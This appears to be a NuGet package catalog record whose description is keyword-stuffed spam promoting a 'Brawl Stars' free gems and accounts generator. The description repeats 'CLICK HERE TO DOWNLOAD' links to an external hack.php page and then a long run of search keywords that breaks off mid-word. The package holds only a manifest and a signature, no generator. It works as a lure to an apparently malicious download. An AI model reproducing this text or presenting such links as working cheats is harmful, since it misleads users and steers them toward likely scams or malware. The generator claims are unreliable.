{
  "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.11.06.29/_brawl-stars-generator-working-2022-version-pyc.2.4.23.json",
  "@type": [
    "PackageDetails",
    "catalog:Permalink"
  ],
  "authors": "SharpCrafters s.r.o.",
  "catalog:commitId": "fb5c681e-9653-42f5-9f7d-776f783f4032",
  "catalog:commitTimeStamp": "2022-01-26T11:06:29.8863824Z",
  "created": "2022-01-26T11:04:06.157Z",
  "description": "# _Brawl Stars Generator Working 2022 Version pyc\n\n\nCLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; [http://7.bltadwin.ru/hack.php](http://7.bltadwin.ru/hack.php)\n\n\nFree Brawl Stars Gems Generator Without Human Verification No Survey．Brawl Stars. Free gem generator in Brawl Stars working. Unlock all skins with this real cheat updated in  Click Here => download free brawl pass generator no human verification brawl stars hack gems generator.\n\n## [CLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; http://7.bltadwin.ru/hack.php](http://7.bltadwin.ru/hack.php)\n\n · Brawl Stars - Generate unlimited Coins and Gems Step 1 Choose the amount of resources you wish to generate and activate the option Bonus Giftcard if you want it too. Step 2 Enter your Username and choose your platform where you have installed the app on. Step 3. Open 62 megaboxes and unlock legendary brawler and skins! Brawl Stars Accounts Generator Free. Brawl Stars Free Accounts (Gems) , Brawl Stars Passwords. Brawl Stars enthusiasts this article is for you. If you are looking for Brawl Stars free accounts, you will be able to find them on this download Stars Before I get the free account and password, I want to give information about Brawl Stars.\n\nbrawl stars generator 2022, brawl stars generator no human verification 2021, brawl stars generator 2021, brawl stars generator gems, brawl stars generator no human verification, brawl stars generator without human verification, brawl stars generator.net, do brawl stars gem generators work, brawl stars generator no human verification 2020, brawl stars.generator.yt, brawl stars generator apk download, brawl stars generator android, brawl stars generator account, brawl stars generator android 2021, brawl stars generator apk, brawl stars generator android 2020, brawl stars account generator no human verification, brawl stars gem generator apk, the brawl stars trophies generator, brawl stars brawler generator, brawl stars generator bez weryfikacji, brawl stars brawler generator no human verification, brawl stars box generator, brawl stars mega box generator, brawl stars generator free brawl gems 2021, brawl stars brawl pass generator, brawl stars balkan generator, brawl stars generator.com, brawl stars generator-claim unlimited gems, brawl stars character generator, brawl stars gem generator.com, brawl stars generator gems and coins no human verification, random brawl stars character generator, brawl stars gift card generator, brawl stars redeem code generator, code for brawl stars gems, brawl stars generator de gemuri, brawl stars generator download, generador de gemas brawl stars, brawl stars gems generator download, do brawl stars gem generator work, generator do brawl stars, generator de brawl stars, brawl stars generator elmas hilesi, brawl stars elmas generator, brawl stars-evolution generator, brawl stars edelstenen generator, easygems.org brawl stars generator, brawl stars elmas hilesi hack generator, brawl stars elmas generator 2021, brawl stars elmas generator 2020, free gems in brawl stars 2020, brawl stars generator free gems, brawl stars fusion generator, brawl stars font generator, brawl stars free generator, brawl stars account generator free, brawl stars name font generator, star points brawl stars free generator, free gem generator for brawl stars, brawl stars generator gems free, brawl stars generator gemów, brawl stars gem generator 2021, brawl stars gems generator no human verification, brawl stars gem generator no human verification 2021, brawl stars gem generator 2020, gem generator for brawl stars, brawl stars generator hack, brawl stars generator hack 2020, brawl stars generator hack 2021, brawl stars hack generator no human verification, brawl stars resources generator no human verification, working brawl stars generator no human verification, brawl stars generator ios, brawl stars gem generator ios, free gems in brawl stars generator, brawl stars generator iphone, brawl stars hack generator ios, braw",
  "id": "_Brawl-Stars-Generator-Working-2022-Version-pyc",
  "isPrerelease": false,
  "language": "en-US",
  "lastEdited": "2022-01-26T11:06:07.163Z",
  "listed": true,
  "packageHash": "8k3h7kXshBwjwNgWI1bxUsYNiNAv6voLdAhmadYUqmBN3fAWafNVn7NufRn9qqTWTmWZm3oenRpoSfywwnT5Iw==",
  "packageHashAlgorithm": "SHA512",
  "packageSize": 11391,
  "published": "2022-01-26T11:04:06.157Z",
  "requireLicenseAcceptance": false,
  "title": "_Brawl-Stars-Generator-Working-2022-Version-pyc",
  "verbatimVersion": "2.4.23",
  "version": "2.4.23",
  "packageEntries": [
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.11.06.29/_brawl-stars-generator-working-2022-version-pyc.2.4.23.json#oqhmqlkroa.nuspec",
      "@type": "PackageEntry",
      "compressedLength": 1260,
      "fullName": "oqhmqlkroa.nuspec",
      "length": 4468,
      "name": "oqhmqlkroa.nuspec"
    },
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.11.06.29/_brawl-stars-generator-working-2022-version-pyc.2.4.23.json#.signature.p7s",
      "@type": "PackageEntry",
      "compressedLength": 9471,
      "fullName": ".signature.p7s",
      "length": 9471,
      "name": ".signature.p7s"
    }
  ],
  "@context": {
    "@vocab": "http://schema.nuget.org/schema#",
    "catalog": "http://schema.nuget.org/catalog#",
    "xsd": "http://www.w3.org/2001/XMLSchema#",
    "dependencies": {
      "@id": "dependency",
      "@container": "@set"
    },
    "dependencyGroups": {
      "@id": "dependencyGroup",
      "@container": "@set"
    },
    "packageEntries": {
      "@id": "packageEntry",
      "@container": "@set"
    },
    "packageTypes": {
      "@id": "packageType",
      "@container": "@set"
    },
    "supportedFrameworks": {
      "@id": "supportedFramework",
      "@container": "@set"
    },
    "tags": {
      "@id": "tag",
      "@container": "@set"
    },
    "vulnerabilities": {
      "@id": "vulnerability",
      "@container": "@set"
    },
    "published": {
      "@type": "xsd:dateTime"
    },
    "created": {
      "@type": "xsd:dateTime"
    },
    "lastEdited": {
      "@type": "xsd:dateTime"
    },
    "catalog:commitTimeStamp": {
      "@type": "xsd:dateTime"
    },
    "reasons": {
      "@container": "@set"
    }
  }
}